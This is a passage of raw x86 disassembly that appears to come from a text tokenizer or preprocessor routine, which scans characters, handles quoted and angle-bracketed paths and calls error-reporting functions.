  409822:	mov    bl,0xb
  409824:	jmp    0x4096ed
  409829:	push   0x9
  40982b:	pop    eax
  40982c:	mov    bl,al
  40982e:	jmp    0x4096ed
  409833:	mov    bl,0x8
  409835:	jmp    0x4096ed
  40983a:	test   bh,bh
  40983c:	jne    0x4096eb
  409842:	cmp    BYTE PTR ds:0x421f11,bh
  409848:	jne    0x40992b
  40984e:	jmp    0x4096eb
  409853:	cmp    eax,0x44
  409856:	jg     0x4098ce
  409858:	je     0x409875
  40985a:	push   0x3c
  40985c:	pop    edx
  40985d:	cmp    eax,edx
  40985f:	je     0x4098ca
  409861:	cmp    eax,0x3d
  409864:	je     0x4098c3
  409866:	cmp    eax,0x3e
  409869:	jle    0x4098e4
  40986b:	cmp    eax,0x40
  40986e:	jle    0x4098ca
  409870:	cmp    eax,0x42
  409873:	jne    0x4098e4
  409875:	mov    bl,0xd
  409877:	cmp    bl,0xc
  40987a:	jne    0x40991b
  409880:	push   0x3c
  409882:	pop    edx
  409883:	cmp    BYTE PTR [ebp-0x3],0x18
  409887:	jne    0x4096ed
  40988d:	cmp    di,dx
  409890:	jne    0x4096ed
  409896:	call   0x4076fe
  40989b:	movzx  eax,ax
  40989e:	push   0x3c
  4098a0:	pop    ecx
  4098a1:	cmp    ax,cx
  4098a4:	jne    0x409904
  4098a6:	lea    eax,[ebp+0x8]
  4098a9:	push   eax
  4098aa:	lea    edx,[ebp-0xc]
  4098ad:	mov    ecx,esi
  4098af:	call   0x408394
  4098b4:	dec    DWORD PTR ds:0x4216d4
  4098ba:	push   0xa
  4098bc:	mov    esi,eax
  4098be:	mov    bl,0x6
  4098c0:	pop    edi
  4098c1:	jmp    0x409913
  4098c3:	mov    bl,cl
  4098c5:	jmp    0x4096ed
  4098ca:	mov    bl,0xc
  4098cc:	jmp    0x409883
  4098ce:	cmp    eax,0x46
  4098d1:	je     0x409875
  4098d3:	cmp    eax,0x52
  4098d6:	je     0x409875
  4098d8:	cmp    eax,0x5c
  4098db:	je     0x4098fd
  4098dd:	cmp    eax,0xffff
  4098e2:	je     0x4098f6
  4098e4:	mov    ecx,edi
  4098e6:	call   0x40358a
  4098eb:	mov    bl,al
  4098ed:	neg    bl
  4098ef:	sbb    bl,bl
  4098f1:	and    bl,0xa
  4098f4:	jmp    0x409877
  4098f6:	mov    bl,0x6
  4098f8:	jmp    0x4096ed
  4098fd:	mov    bl,0x3
  4098ff:	jmp    0x4096ed
  409904:	push   DWORD PTR ds:0x421f0c
  40990a:	push   eax
  40990b:	call   DWORD PTR ds:0x437464
  409911:	pop    ecx
  409912:	pop    ecx
  409913:	movzx  ecx,bh
  409916:	jmp    0x4096f1
  40991b:	cmp    bl,0x1
  40991e:	jne    0x4096ed
  409924:	mov    bl,BYTE PTR [ebp-0x3]
  409927:	test   bh,bh
  409929:	jne    0x409941
  40992b:	xor    cl,cl
  40992d:	mov    BYTE PTR [ebp-0x2],0x0
  409931:	call   0x408f53
  409936:	inc    DWORD PTR ds:0x4216d4
  40993c:	jmp    0x4099ef
  409941:	cmp    bl,0x19
  409944:	je     0x409a0b
  40994a:	movzx  eax,bh
  40994d:	imul   eax,eax,0xe
  409950:	mov    bh,BYTE PTR [eax+0x4013d9]
  409956:	jmp    0x409701
  40995b:	pop    edx
  40995c:	mov    WORD PTR [esi],di
  40995f:	add    esi,edx
  409961:	cmp    esi,DWORD PTR [ebp+0x8]
  409964:	jne    0x4099ef
  40996a:	cmp    DWORD PTR ds:0x4216dc,0x0
  409971:	jne    0x4099b7
  409973:	xor    ecx,ecx
  409975:	mov    edi,0x800
  40997a:	mov    eax,edi
  40997c:	mul    edx
  40997e:	seto   cl
  409981:	neg    ecx
  409983:	or     ecx,eax
  409985:	call   0x40a2fb
  40998a:	push   0x400
  40998f:	push   DWORD PTR [ebp-0xc]
  409992:	mov    ds:0x4216dc,eax
  409997:	push   edi
  409998:	push   eax
  409999:	call   DWORD PTR ds:0x43746c
  40999f:	mov    eax,ds:0x4216dc
  4099a4:	add    esp,0x10
  4099a7:	lea    esi,[eax+0x800]
  4099ad:	mov    DWORD PTR [ebp-0x8],edi
  4099b0:	add    eax,0x1000
  4099b5:	jmp    0x4099ec
  4099b7:	mov    esi,DWORD PTR [ebp-0x8]
  4099ba:	lea    edi,[esi+0x400]
  4099c0:	cmp    edi,esi
  4099c2:	jb     0x4099f9
  4099c4:	mov    ecx,DWORD PTR ds:0x4216dc
  4099ca:	lea    edx,[edi+edi*1]
  4099cd:	call   0x40a33e
  4099d2:	mov    ecx,eax
  4099d4:	mov    DWORD PTR [ebp-0x10],ecx
  4099d7:	test   ecx,ecx
  4099d9:	je     0x4099f9
  4099db:	mov    eax,edi
  4099dd:	mov    DWORD PTR [ebp-0x8],eax
  4099e0:	mov    DWORD PTR ds:0x4216dc,ecx
  4099e6:	lea    esi,[ecx+esi*2]
  4099e9:	lea    eax,[ecx+eax*2]
  4099ec:	mov    DWORD PTR [ebp+0x8],eax
  4099ef:	call   0x4076fe
  4099f4:	jmp    0x409599
  4099f9:	push   0x419
  4099fe:	push   DWORD PTR ds:0x4216d4
  409a04:	call   0x405021
  409a09:	pop    ecx
  409a0a:	pop    ecx
  409a0b:	push   DWORD PTR ds:0x421f0c
  409a11:	push   edi
  409a12:	call   DWORD PTR ds:0x437464
  409a18:	mov    ebx,DWORD PTR [ebp-0xc]
  409a1b:	pop    ecx
  409a1c:	pop    ecx
  409a1d:	jmp    0x409a32
  409a1f:	movzx  eax,WORD PTR [esi-0x2]
  409a23:	push   eax
  409a24:	call   DWORD PTR ds:0x43753c
  409a2a:	pop    ecx
  409a2b:	test   eax,eax
  409a2d:	je     0x409a36
  409a2f:	add    esi,0xfffffffe
  409a32:	cmp    esi,ebx
  409a34:	ja     0x409a1f
  409a36:	mov    ecx,DWORD PTR ds:0x4216dc
  409a3c:	xor    eax,eax
  409a3e:	mov    WORD PTR [esi],ax
  409a41:	test   ecx,ecx
  409a43:	je     0x409a5b
  409a45:	sub    esi,ecx
  409a47:	sar    esi,1
  409a49:	lea    edx,[esi*2+0x2]
  409a50:	call   0x40a33e
  409a55:	test   eax,eax
  409a57:	je     0x409a67
  409a59:	jmp    0x409a62
  409a5b:	mov    ecx,ebx
  409a5d:	call   0x40dd18
  409a62:	mov    ds:0x4216dc,eax
  409a67:	pop    edi
  409a68:	pop    esi
  409a69:	pop    ebx
  409a6a:	leave  
  409a6b:	ret    0x4
  409a6e:	push   ebp
  409a6f:	mov    ebp,esp
  409a71:	sub    esp,0x14
  409a74:	push   ebx
  409a75:	mov    eax,ecx
  409a77:	push   esi
  409a78:	push   edi
  409a79:	lea    edi,[eax+0x2]
  409a7c:	mov    DWORD PTR [ebp-0x10],eax
  409a7f:	movzx  eax,WORD PTR [eax]
  409a82:	xor    bh,bh
  409a84:	mov    DWORD PTR [ebp-0xc],edx
  409a87:	mov    BYTE PTR [ebp-0x1],bh
  409a8a:	mov    DWORD PTR [ebp-0x8],edi
  409a8d:	sub    eax,0x22
  409a90:	je     0x409aa7
  409a92:	dec    eax
  409a93:	dec    eax
  409a94:	je     0x409aa3
  409a96:	sub    eax,0x57
  409a99:	je     0x409a9f
  409a9b:	xor    bl,bl
  409a9d:	jmp    0x409aad
  409a9f:	mov    bl,0x8
  409aa1:	jmp    0x409aad
  409aa3:	mov    bl,0x2
  409aa5:	jmp    0x409aad
  409aa7:	mov    BYTE PTR [ebp-0x1],0x1
  409aab:	mov    bl,0x10
  409aad:	call   0x4076fe
  409ab2:	movzx  esi,ax
  409ab5:	push   0x5e
  409ab7:	pop    eax
  409ab8:	cmp    si,ax
  409abb:	jne    0x409ae9
  409abd:	call   0x4076fe
  409ac2:	movzx  esi,ax
  409ac5:	push   0x5c
  409ac7:	mov    eax,esi
  409ac9:	pop    ecx
  409aca:	cmp    eax,ecx
  409acc:	jg     0x409b20
  409ace:	je     0x409b3a
  409ad0:	cmp    eax,0xa
  409ad3:	je     0x409b3a
  409ad5:	cmp    eax,0x23
  409ad8:	je     0x409b3a
  409ada:	cmp    eax,0x24
  409add:	je     0x409b2e
  409adf:	cmp    eax,0x27
  409ae2:	jle    0x409ae9
  409ae4:	cmp    eax,0x29
  409ae7:	jle    0x409b2e
  409ae9:	movzx  eax,si
  409aec:	cmp    eax,0x29
  409aef:	jg     0x409b76
  409af5:	push   0x9
  409af7:	je     0x409b71
  409af9:	pop    ecx
  409afa:	sub    eax,ecx
  409afc:	je     0x409b63
  409afe:	dec    eax
  409aff:	je     0x409bcd
  409b05:	sub    eax,0x16
  409b08:	je     0x409b63
  409b0a:	dec    eax
  409b0b:	dec    eax
  409b0c:	je     0x409b4f
  409b0e:	dec    eax
  409b0f:	je     0x409b48
  409b11:	dec    eax
  409b12:	je     0x409b41
  409b14:	sub    eax,0x4
  409b17:	jne    0x409b97
  409b19:	mov    dl,0x8
  409b1b:	jmp    0x409be7
  409b20:	sub    eax,0x5e
  409b23:	je     0x409b2e
  409b25:	sub    eax,0x1d
  409b28:	je     0x409b2e
  409b2a:	dec    eax
  409b2b:	dec    eax
  409b2c:	jne    0x409ae9
  409b2e:	push   0x5e
  409b30:	pop    eax
  409b31:	mov    WORD PTR [edi],ax
  409b34:	add    edi,0x2
  409b37:	mov    DWORD PTR [ebp-0x8],edi
  409b3a:	xor    dl,dl
  409b3c:	jmp    0x409be7
  409b41:	mov    dl,0x7
  409b43:	jmp    0x409be7
  409b48:	mov    dl,0x1
  409b4a:	jmp    0x409be7
  409b4f:	mov    dl,0xe
  409b51:	cmp    bl,0x12
  409b54:	jne    0x409be7
  409b5a:	mov    BYTE PTR [ebp-0x1],0x1
  409b5e:	jmp    0x409be7
  409b63:	cmp    BYTE PTR [ebp-0x1],0x0
  409b67:	setne  dl
  409b6a:	dec    dl
  409b6c:	and    dl,0x5
  409b6f:	jmp    0x409be7
  409b71:	pop    eax
  409b72:	mov    dl,al
  409b74:	jmp    0x409be7
  409b76:	sub    eax,0x3a
  409b79:	je     0x409be5
  409b7b:	dec    eax
  409b7c:	je     0x409be1
  409b7e:	dec    eax
  409b7f:	dec    eax
  409b80:	je     0x409bdd
  409b82:	sub    eax,0x1f
  409b85:	je     0x409bd9
  409b87:	sub    eax,0x1f
  409b8a:	je     0x409bd5
  409b8c:	dec    eax
  409b8d:	dec    eax
  409b8e:	je     0x409bd1
  409b90:	sub    eax,0xff82
  409b95:	je     0x409bcd
  409b97:	test   BYTE PTR ds:0x4216e4,0x80
  409b9e:	mov    ecx,esi
  409ba0:	je     0x409bbd
  409ba2:	call   0x40358a
  409ba7:	test   al,al
  409ba9:	jne    0x409bb9
  409bab:	cmp    si,0x2a
  409baf:	je     0x409bb9
  409bb1:	push   0x40
  409bb3:	pop    eax
  409bb4:	cmp    si,ax
  409bb7:	jne    0x409b3a
  409bb9:	mov    dl,0xa
  409bbb:	jmp    0x409be7
  409bbd:	call   0x40358a
  409bc2:	mov    dl,al
  409bc4:	neg    dl
  409bc6:	sbb    dl,dl
  409bc8:	and    dl,0xa
  409bcb:	jmp    0x409be7
  409bcd:	mov    dl,0x6
  409bcf:	jmp    0x409be7
  409bd1:	mov    dl,0xc
  409bd3:	jmp    0x409be7
  409bd5:	mov    dl,0xb
  409bd7:	jmp    0x409be7
  409bd9:	mov    dl,0xd
  409bdb:	jmp    0x409be7
  409bdd:	mov    dl,0x2
  409bdf:	jmp    0x409be7
  409be1:	mov    dl,0x3
  409be3:	jmp    0x409be7
  409be5:	mov    dl,0x4
  409be7:	movzx  ecx,bl
  409bea:	imul   ecx,ecx,0xf
  409bed:	cmp    BYTE PTR [ebp-0x1],0x0
  409bf1:	movzx  eax,dl
  409bf4:	mov    bl,BYTE PTR [ecx+eax*1+0x4012b8]
  409bfb:	je     0x409c05
  409bfd:	cmp    bl,0x1
  409c00:	jne    0x409c05
  409c02:	add    bl,0xf
  409c05:	test   bh,bh
  409c07:	je     0x409c73
  409c09:	cmp    dl,0x6
  409c0c:	jne    0x409c67
  409c0e:	inc    DWORD PTR ds:0x4216d4
  409c14:	mov    BYTE PTR ds:0x411021,0x1
  409c1b:	call   0x4076fe
  409c20:	movzx  esi,ax
  409c23:	push   0x20
  409c25:	pop    eax
  409c26:	mov    BYTE PTR ds:0x411021,0x0
  409c2d:	cmp    si,ax
  409c30:	je     0x409c45
  409c32:	push   0x9
  409c34:	pop    eax
  409c35:	cmp    si,ax
  409c38:	je     0x409c45
  409c3a:	cmp    edi,0x4216f2
  409c40:	setne  bl
  409c43:	jmp    0x409c73
  409c45:	push   0x40
  409c47:	pop    eax
  409c48:	push   0x20
  409c4a:	mov    bl,al
  409c4c:	pop    edi
  409c4d:	call   0x4076fe
  409c52:	movzx  esi,ax
  409c55:	cmp    si,di
  409c58:	je     0x409c4d
  409c5a:	push   0x9
  409c5c:	pop    eax
  409c5d:	cmp    si,ax
  409c60:	je     0x409c4d
  409c62:	mov    edi,DWORD PTR [ebp-0x8]
  409c65:	jmp    0x409c73
  409c67:	push   0x5c
  409c69:	pop    eax
  409c6a:	mov    WORD PTR [edi],ax
  409c6d:	add    edi,0x2
  409c70:	mov    DWORD PTR [ebp-0x8],edi
  409c73:	xor    bh,bh
  409c75:	cmp    edi,DWORD PTR [ebp-0xc]
  409c78:	jb     0x409c8c
  409c7a:	push   0x434
  409c7f:	push   DWORD PTR ds:0x4216d4
  409c85:	call   0x405021
  409c8a:	pop    ecx
  409c8b:	pop    ecx
  409c8c:	cmp    bl,0x40
  409c8f:	je     0x409cce
  409c91:	test   bl,0x20
  409c94:	je     0x409cb4
  409c96:	movzx  eax,si
  409c99:	push   eax
  409c9a:	movzx  eax,bl
  409c9d:	and    eax,0xffffffdf
  409ca0:	add    eax,0x3e8
  409ca5:	push   eax
  409ca6:	push   DWORD PTR ds:0x4216d4
  409cac:	call   0x405021
  409cb1:	add    esp,0xc
  409cb4:	cmp    bl,0xf
  409cb7:	jne    0x409cc0
  409cb9:	mov    bh,0x1
  409cbb:	jmp    0x409aad
  409cc0:	mov    WORD PTR [edi],si
  409cc3:	add    edi,0x2
  409cc6:	mov    DWORD PTR [ebp-0x8],edi
  409cc9:	jmp    0x409aad
  409cce:	push   DWORD PTR ds:0x421f0c
  409cd4:	push   esi
  409cd5:	call   DWORD PTR ds:0x437464
  409cdb:	pop    ecx
  409cdc:	pop    ecx
  409cdd:	mov    ecx,DWORD PTR [ebp-0x10]
  409ce0:	xor    eax,eax
  409ce2:	mov    WORD PTR [edi],ax
  409ce5:	call   0x40c044
  409cea:	pop    edi
  409ceb:	pop    esi
  409cec:	pop    ebx
  409ced:	leave  
  409cee:	ret    
  409cef:	push   ebp
  409cf0:	mov    ebp,esp
  409cf2:	sub    esp,0x274
  409cf8:	mov    eax,ds:0x411018
  409cfd:	xor    eax,ebp
  409cff:	mov    DWORD PTR [ebp-0x4],eax
  409d02:	push   ebx
  409d03:	push   esi
  409d04:	xor    eax,eax
  409d06:	push   edi
  409d07:	mov    edi,ecx
  409d09:	mov    DWORD PTR [ebp-0x270],eax
  409d0f:	mov    ebx,eax
  409d11:	movzx  eax,WORD PTR [edi]
  409d14:	test   ax,ax
  409d17:	je     0x40a181
  409d1d:	push   0x23
  409d1f:	pop    ecx
  409d20:	cmp    ax,cx
  409d23:	je     0x40a181
  409d29:	push   0x40193c
  409d2e:	push   edi
  409d2f:	call   DWORD PTR ds:0x437544
  409d35:	pop    ecx
  409d36:	pop    ecx
  409d37:	mov    esi,eax
  409d39:	push   0x2
  409d3b:	mov    DWORD PTR [ebp-0x25c],0x20
  409d45:	mov    DWORD PTR [ebp-0x260],0x9
  409d4f:	pop    edx
  409d50:	test   esi,esi
  409d52:	je     0x409e20
  409d58:	push   0x23
  409d5a:	pop    ecx
  409d5b:	cmp    WORD PTR [esi],cx
  409d5e:	jne    0x409d62
  409d60:	mov    ebx,ecx
  409d62:	xor    eax,eax
  409d64:	mov    WORD PTR [esi],ax
  409d67:	test   bx,bx
  409d6a:	jne    0x409dac
  409d6c:	lea    ebx,[esi+0x2]
  409d6f:	jmp    0x409da4
  409d71:	cmp    ax,cx
  409d74:	je     0x409dac
  409d76:	cmp    ax,WORD PTR [ebp-0x25c]
  409d7d:	je     0x409da2
  409d7f:	cmp    ax,WORD PTR [ebp-0x260]
  409d86:	je     0x409da2
  409d88:	push   ebx
  409d89:	push   0x409
  409d8e:	push   DWORD PTR ds:0x4216d4
  409d94:	call   0x405021
  409d99:	add    esp,0xc
  409d9c:	push   0x23
  409d9e:	pop    ecx
  409d9f:	push   0x2
  409da1:	pop    edx
  409da2:	add    ebx,edx
  409da4:	movzx  eax,WORD PTR [ebx]
  409da7:	test   ax,ax
  409daa:	jne    0x409d71
  409dac:	xor    ebx,ebx
  409dae:	cmp    esi,edi
  409db0:	jbe    0x409dd0
  409db2:	lea    eax,[esi-0x2]
  409db5:	movzx  ecx,WORD PTR [eax]
  409db8:	cmp    cx,WORD PTR [ebp-0x25c]
  409dbf:	je     0x409dca
  409dc1:	cmp    cx,WORD PTR [ebp-0x260]
  409dc8:	jne    0x409dd0
  409dca:	mov    esi,eax
  409dcc:	cmp    eax,edi
  409dce:	ja     0x409db2
  409dd0:	xor    eax,eax
  409dd2:	mov    WORD PTR [esi],ax
  409dd5:	movzx  eax,WORD PTR [edi]
  409dd8:	cmp    eax,0x3c
  409ddb:	jne    0x409ead
  409de1:	cmp    WORD PTR [esi-0x2],0x3e
  409de6:	jne    0x409ead
  409dec:	add    edi,edx
  409dee:	xor    eax,eax
  409df0:	mov    ecx,edi
  409df2:	mov    WORD PTR [esi-0x2],ax
  409df6:	call   0x40e627
  409dfb:	mov    esi,eax
  409dfd:	cmp    esi,edi
  409dff:	jne    0x409e0a
  409e01:	mov    ecx,edi
  409e03:	call   0x40dd18
  409e08:	mov    esi,eax
  409e0a:	mov    ecx,0x401770
  409e0f:	call   0x40a26b
  409e14:	test   eax,eax
  409e16:	je     0x409e41
  409e18:	mov    eax,DWORD PTR [eax+0x8]
  409e1b:	mov    ecx,DWORD PTR [eax+0x4]
  409e1e:	jmp    0x409e43
  409e20:	mov    ecx,edi
  409e22:	xor    ebx,ebx
  409e24:	lea    edx,[ecx+0x2]
  409e27:	mov    ax,WORD PTR [ecx]
  409e2a:	add    ecx,0x2
  409e2d:	cmp    ax,bx
  409e30:	jne    0x409e27
  409e32:	sub    ecx,edx
  409e34:	sar    ecx,1
  409e36:	push   0x2
  409e38:	lea    esi,[edi+ecx*2]
  409e3b:	pop    edx
  409e3c:	jmp    0x409dae
  409e41:	mov    ecx,ebx
  409e43:	test   ecx,ecx
  409e45:	je     0x409e63
  409e47:	call   0x40dd18
  409e4c:	mov    edi,eax
  409e4e:	mov    ecx,edi
  409e50:	call   0x40e627
  409e55:	mov    ebx,eax
  409e57:	cmp    ebx,edi
  409e59:	je     0x409e63
  409e5b:	push   edi
  409e5c:	call   DWORD PTR ds:0x43754c
  409e62:	pop    ecx
  409e63:	lea    eax,[ebp-0x264]
  409e69:	push   eax
  409e6a:	lea    eax,[ebp-0x258]
  409e70:	push   eax
  409e71:	mov    edx,esi
  409e73:	mov    ecx,ebx
  409e75:	call   0x407418
  409e7a:	mov    edi,eax
  409e7c:	test   edi,edi
  409e7e:	jne    0x409e94
  409e80:	push   esi
  409e81:	push   0x41c
  409e86:	push   DWORD PTR ds:0x4216d4
  409e8c:	call   0x405021
  409e91:	add    esp,0xc
  409e94:	test   ebx,ebx
  409e96:	je     0x409ea0
  409e98:	push   ebx
  409e99:	call   DWORD PTR ds:0x43754c
  409e9f:	pop    ecx
  409ea0:	push   esi
  409ea1:	call   DWORD PTR ds:0x43754c
  409ea7:	pop    ecx
  409ea8:	jmp    0x40a05e
  409ead:	push   0x22
  409eaf:	pop    ecx
  409eb0:	cmp    ax,cx
  409eb3:	jne    0x409ec3
  409eb5:	cmp    WORD PTR [esi-0x2],cx
  409eb9:	jne    0x409ec3
  409ebb:	xor    eax,eax
  409ebd:	mov    WORD PTR [esi-0x2],ax
  409ec1:	add    edi,edx
  409ec3:	mov    ecx,edi
  409ec5:	call   0x40e627
  409eca:	mov    ebx,eax
  409ecc:	cmp    ebx,edi
  409ece:	jne    0x409ed9
  409ed0:	mov    ecx,edi
  409ed2:	call   0x40dd18
  409ed7:	mov    ebx,eax
  409ed9:	lea    eax,[ebp-0x264]
  409edf:	push   eax
  409ee0:	lea    edx,[ebp-0x258]
  409ee6:	mov    ecx,ebx
  409ee8:	call   0x40726d
  409eed:	test   eax,eax
  409eef:	jne    0x40a05e
  409ef5:	push   0x401944
  409efa:	push   ebx
  409efb:	call   DWORD PTR ds:0x437544
  409f01:	pop    ecx
  409f02:	pop    ecx
  409f03:	test   eax,eax
  409f05:	jne    0x40a04a
  409f0b:	mov    eax,ds:0x432354
  409f10:	mov    DWORD PTR [ebp-0x25c],eax
  409f16:	test   eax,eax
  409f18:	js     0x40a036
  409f1e:	mov    ecx,eax
  409f20:	imul   ecx,ecx,0xc
  409f23:	add    ecx,0x43235c
  409f29:	mov    DWORD PTR [ebp-0x26c],ecx
  409f2f:	cmp    eax,DWORD PTR ds:0x432354
  409f35:	jne    0x409f3f
  409f37:	mov    ecx,DWORD PTR ds:0x421f14
  409f3d:	jmp    0x409f41
  409f3f:	mov    ecx,DWORD PTR [ecx]
  409f41:	call   0x40a193
  409f46:	mov    DWORD PTR [ebp-0x260],eax
  409f4c:	test   eax,eax
  409f4e:	je     0x40a007
  409f54:	mov    ecx,eax
  409f56:	xor    esi,esi
  409f58:	lea    edx,[ecx+0x2]
  409f5b:	mov    ax,WORD PTR [ecx]
  409f5e:	add    ecx,0x2
  409f61:	cmp    ax,si
  409f64:	jne    0x409f5b
  409f66:	sub    ecx,edx
  409f68:	mov    edx,ebx
  409f6a:	sar    ecx,1
  409f6c:	lea    esi,[edx+0x2]
  409f6f:	mov    ax,WORD PTR [edx]
  409f72:	add    edx,0x2
  409f75:	cmp    ax,WORD PTR [ebp-0x270]
  409f7c:	jne    0x409f6f
  409f7e:	sub    edx,esi
  409f80:	sar    edx,1
  409f82:	push   0x2
  409f84:	lea    esi,[edx+0x2]
  409f87:	add    esi,ecx
  409f89:	xor    ecx,ecx
  409f8b:	pop    edx
  409f8c:	mov    eax,esi
  409f8e:	mul    edx
  409f90:	seto   cl
  409f93:	neg    ecx
  409f95:	or     ecx,eax
  409f97:	call   0x40a2fb
  409f9c:	push   DWORD PTR [ebp-0x260]
  409fa2:	mov    DWORD PTR [ebp-0x268],eax
  409fa8:	push   esi
  409fa9:	push   eax
  409faa:	call   DWORD PTR ds:0x4373d0
  409fb0:	add    esp,0xc
  409fb3:	push   0x40194c
  409fb8:	push   esi
  409fb9:	push   DWORD PTR [ebp-0x268]
  409fbf:	call   DWORD PTR ds:0x4373d4
  409fc5:	add    esp,0xc
  409fc8:	push   ebx
  409fc9:	push   esi
  409fca:	mov    esi,DWORD PTR [ebp-0x268]
  409fd0:	push   esi
  409fd1:	call   DWORD PTR ds:0x4373d4
  409fd7:	add    esp,0xc
  409fda:	lea    eax,[ebp-0x264]
  409fe0:	push   eax
  409fe1:	lea    edx,[ebp-0x258]
  409fe7:	mov    ecx,esi
  409fe9:	call   0x40726d
  409fee:	push   DWORD PTR [ebp-0x260]
  409ff4:	test   eax,eax
  409ff6:	jne    0x40a02d
  409ff8:	call   DWORD PTR ds:0x43754c
  409ffe:	pop    ecx
  409fff:	push   esi
  40a000:	call   DWORD PTR ds:0x43754c
  40a006:	pop    ecx
  40a007:	mov    eax,DWORD PTR [ebp-0x25c]
  40a00d:	mov    ecx,DWORD PTR [ebp-0x26c]
  40a013:	dec    eax
  40a014:	sub    ecx,0xc
  40a017:	mov    DWORD PTR [ebp-0x25c],eax
  40a01d:	mov    DWORD PTR [ebp-0x26c],ecx
  40a023:	test   eax,eax
  40a025:	jns    0x409f2f
  40a02b:	jmp    0x40a036
  40a02d:	mov    edi,esi
  40a02f:	call   DWORD PTR ds:0x43754c
  40a035:	pop    ecx
  40a036:	push   ebx
  40a037:	call   DWORD PTR ds:0x43754c
  40a03d:	cmp    DWORD PTR [ebp-0x25c],0x0
  40a044:	pop    ecx
  40a045:	jge    0x40a05e
  40a047:	push   edi
  40a048:	jmp    0x40a04b
  40a04a:	push   ebx
  40a04b:	push   0x41c
  40a050:	push   DWORD PTR ds:0x4216d4
  40a056:	call   0x405021
  40a05b:	add    esp,0xc
  40a05e:	xor    ebx,ebx
  40a060:	mov    esi,ebx
  40a062:	cmp    DWORD PTR ds:0x432354,ebx
  40a068:	jle    0x40a0a0
  40a06a:	mov    ebx,0x43235c
  40a06f:	push   DWORD PTR [ebx]
  40a071:	push   edi
  40a072:	call   DWORD PTR ds:0x437548
  40a078:	pop    ecx
  40a079:	pop    ecx
  40a07a:	test   eax,eax
  40a07c:	jne    0x40a092
  40a07e:	push   edi
  40a07f:	push   0x430
  40a084:	push   DWORD PTR ds:0x4216d4
  40a08a:	call   0x405021
  40a08f:	add    esp,0xc
  40a092:	inc    esi
  40a093:	add    ebx,0xc
  40a096:	cmp    esi,DWORD PTR ds:0x432354
  40a09c:	jl     0x40a06f
  40a09e:	xor    ebx,ebx
  40a0a0:	mov    ecx,DWORD PTR ds:0x432354
  40a0a6:	mov    eax,ds:0x421f0c
  40a0ab:	imul   ecx,ecx,0xc
  40a0ae:	inc    DWORD PTR ds:0x432354
  40a0b4:	cmp    BYTE PTR ds:0x421f13,0x0
  40a0bb:	mov    DWORD PTR [ecx+0x432360],eax
  40a0c1:	mov    eax,ds:0x4216d4
  40a0c6:	mov    DWORD PTR [ecx+0x432358],eax
  40a0cc:	mov    eax,ds:0x421f14
  40a0d1:	mov    DWORD PTR [ecx+0x43235c],eax
  40a0d7:	mov    DWORD PTR ds:0x4216e0,ebx
  40a0dd:	je     0x40a0ec
  40a0df:	push   edi
  40a0e0:	push   0x401950
  40a0e5:	call   0x40c2d0
  40a0ea:	pop    ecx
  40a0eb:	pop    ecx
  40a0ec:	mov    edx,0x4015bc
  40a0f1:	mov    ecx,edi
  40a0f3:	call   0x40f94c
  40a0f8:	mov    ds:0x421f0c,eax
  40a0fd:	test   eax,eax
  40a0ff:	jne    0x40a115
  40a101:	push   edi
  40a102:	push   0x41c
  40a107:	push   DWORD PTR ds:0x4216d4
  40a10d:	call   0x405021
  40a112:	add    esp,0xc
  40a115:	mov    ecx,edi
  40a117:	call   0x40dd18
  40a11c:	mov    ds:0x421f14,eax
  40a121:	mov    DWORD PTR ds:0x4216d4,0x1
  40a12b:	mov    BYTE PTR ds:0x411021,0x1
  40a132:	call   0x4076fe
  40a137:	movzx  eax,ax
  40a13a:	push   0x20
  40a13c:	pop    ecx
  40a13d:	cmp    ax,cx
  40a140:	je     0x40a177
  40a142:	push   0x9
  40a144:	pop    ecx
  40a145:	cmp    ax,cx
  40a148:	je     0x40a177
  40a14a:	push   DWORD PTR ds:0x421f0c
  40a150:	mov    BYTE PTR ds:0x411021,0x1
  40a157:	push   eax
  40a158:	call   DWORD PTR ds:0x437464
  40a15e:	dec    DWORD PTR ds:0x4216d4
  40a164:	pop    ecx
  40a165:	pop    ecx
  40a166:	mov    al,0x11
  40a168:	mov    ecx,DWORD PTR [ebp-0x4]
  40a16b:	pop    edi
  40a16c:	pop    esi
  40a16d:	xor    ecx,ebp
  40a16f:	pop    ebx
  40a170:	call   0x40fd0b
  40a175:	leave  
  40a176:	ret    
  40a177:	mov    BYTE PTR ds:0x411021,bl
  40a17d:	mov    al,0x12
  40a17f:	jmp    0x40a168
  40a181:	push   0x407
  40a186:	push   DWORD PTR ds:0x4216d4
  40a18c:	call   0x405021
  40a191:	pop    ecx
  40a192:	pop    ecx
  40a193:	push   ebp
  40a194:	mov    ebp,esp
  40a196:	sub    esp,0x214
  40a19c:	mov    eax,ds:0x411018
  40a1a1:	xor    eax,ebp
  40a1a3:	mov    DWORD PTR [ebp-0x4],eax
  40a1a6:	push   ebx
  40a1a7:	push   esi
  40a1a8:	push   edi
  40a1a9:	xor    ebx,ebx
  40a1ab:	push   ebx
  40a1ac:	push   ebx
  40a1ad:	push   ebx
  40a1ae:	push   ebx
  40a1af:	push   0x100
  40a1b4:	lea    eax,[ebp-0x210]
  40a1ba:	push   eax
  40a1bb:	push   0x3
  40a1bd:	lea    eax,[ebp-0xc]
  40a1c0:	push   eax
  40a1c1:	push   ecx
  40a1c2:	call   DWORD PTR ds:0x437438
  40a1c8:	add    esp,0x24
  40a1cb:	lea    ecx,[ebp-0xc]
  40a1ce:	push   0x2
  40a1d0:	lea    edx,[ecx+0x2]
  40a1d3:	pop    edi
  40a1d4:	mov    ax,WORD PTR [ecx]
  40a1d7:	add    ecx,edi
  40a1d9:	cmp    ax,bx
  40a1dc:	jne    0x40a1d4
  40a1de:	sub    ecx,edx
  40a1e0:	lea    edx,[ebp-0x210]
  40a1e6:	sar    ecx,1
  40a1e8:	lea    esi,[edx+0x2]
  40a1eb:	mov    ax,WORD PTR [edx]
  40a1ee:	add    edx,edi
  40a1f0:	cmp    ax,bx
  40a1f3:	jne    0x40a1eb
  40a1f5:	sub    edx,esi
  40a1f7:	sar    edx,1
  40a1f9:	lea    esi,[edx+0x1]
  40a1fc:	add    esi,ecx
  40a1fe:	xor    ecx,ecx
  40a200:	mov    eax,esi
  40a202:	mul    edi
  40a204:	seto   cl
  40a207:	neg    ecx
  40a209:	or     ecx,eax
  40a20b:	call   0x40a2fb
  40a210:	push   ebx
  40a211:	mov    edi,eax
  40a213:	push   ebx
  40a214:	lea    eax,[ebp-0x210]
  40a21a:	push   eax
  40a21b:	lea    eax,[ebp-0xc]
  40a21e:	push   eax
  40a21f:	push   esi
  40a220:	push   edi
  40a221:	call   DWORD PTR ds:0x43743c
  40a227:	mov    ecx,edi
  40a229:	add    esp,0x18
